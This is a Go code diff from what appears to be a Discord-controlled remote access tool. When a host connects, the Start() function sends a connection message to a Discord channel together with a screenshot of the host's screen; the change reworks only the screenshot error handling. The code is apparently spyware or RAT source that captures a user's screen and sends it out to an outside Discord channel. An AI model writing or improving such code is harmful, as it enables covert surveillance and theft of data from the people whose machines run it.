@@ -43,21 +43,19 @@ func Start() {
 
 	message := discord.GetConnectionMsg(new)
 
-	buffer := funcs.TakeScreenshot()
-	if buffer != nil {
-		bot.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
-			Content: message,
-			Files: []*discordgo.File{{
-				Name:   "ss.jpg",
-				Reader: buffer,
-			}},
-		})
-	} else {
-		bot.ChannelMessageSend(
-			channelID,
-			message,
-		)
+	ss, err := funcs.TakeScreenshot()
+	if err != nil {
+		bot.ChannelMessageSend(channelID, message)
+		return
 	}
+
+	bot.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
+		Content: message,
+		Files: []*discordgo.File{{
+			Name:   "ss.jpg",
+			Reader: ss,
+		}},
+	})
 
 	select {}
 }
